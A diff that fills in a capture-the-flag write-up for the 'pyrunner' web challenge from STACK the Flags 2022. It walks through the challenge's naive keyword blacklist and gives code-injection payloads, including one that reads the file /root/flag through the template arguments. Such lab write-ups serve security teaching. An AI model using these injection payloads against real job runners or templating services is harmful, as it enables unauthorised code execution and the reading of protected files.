@@ -4,7 +4,7 @@
 
 CTF: STACK the Flags 2022
 
-**TO BE DONE**
+Can you help us test our internal Python job runner prototype?
 
 <br />
 <a href="/files/stacktheflags-2022/web_pyrunner.zip" download>
@@ -15,6 +15,80 @@ CTF: STACK the Flags 2022
 
 _Pwned by [@skytect](https://github.com/skytect)_
 
-**TO BE DONE**
+Opening the webpage, we see fields for a template and arguments, hinting at
+template injection.
+
+![Webpage with Template](/images/stacktheflags-2022/pyrunner-1.png)
+
+We appear to be working with some form of Jinja template.
+
+```python
+import uvicorn
+from fastapi import FastAPI, Request, Response, Form, File
+from fastapi.staticfiles import StaticFiles
+from fastapi.templating import Jinja2Templates
+from fastapi.responses import JSONResponse
+
+app = FastAPI()
+app.mount("/static", StaticFiles(directory="static"), name="static")
+templates = Jinja2Templates(directory="templates")
+
+print("Webserver: <title>")
+
+@app.get("/")
+def index(request: Request):
+    return templates.TemplateResponse("index.html", {"request": request})
+
+if __name__ == "__main__":
+    print("Hello!")
+    #uvicorn.run("app:app", host="<host>", port=<port>, reload=True) #TODO: add support for files that don't exit
+```
+
+Since we're given the source code, let's dig through it.
+
+Looking closer, we find a filter mechanism.
+
+```python
+# /app/app.py L13
+disallowed = ["import", ";", "\n", "eval", "exec", "os"]
+
+# /app/app.py L29–33
+def textfilter(text):
+    for i in disallowed:
+        if i in text:
+            text = text.replace(i, "")
+    return text
+
+# /app/app.py L77–80
+for argument in template["arguments"]:
+    contents = contents.replace(
+        f"<{argument}>", textfilter(data["arguments"][argument])
+    )
+```
+
+It appears that it just replaces text directly unless it's in the `disallowed`
+blacklist.
+
+Let's try to inject something. Using the payload `>"+__file__+"<`, we can sanity
+check that this actually works.
+
+![Webpage with __file__ injected](/images/stacktheflags-2022/pyrunner-2.png)
+
+Now, let's try to get the flag. I dug around and found the flag's location in
+the `Dockerfile`.
+
+```docker
+# /Dockerfile L5
+COPY ./src/flag /root/flag
+```
+
+The blacklist is actually quite easy to circumvent, since we just need to read a
+file.
+
+I used this payload: `>"+open("/root/flag", "r").read()+"<`.
+
+![Webpage with flag injected](/images/stacktheflags-2022/pyrunner-3.png)
+
+Yay flag!
 
 `STF22{4ut0m4t3d_c0mm4nd_1nj3ct10n}`
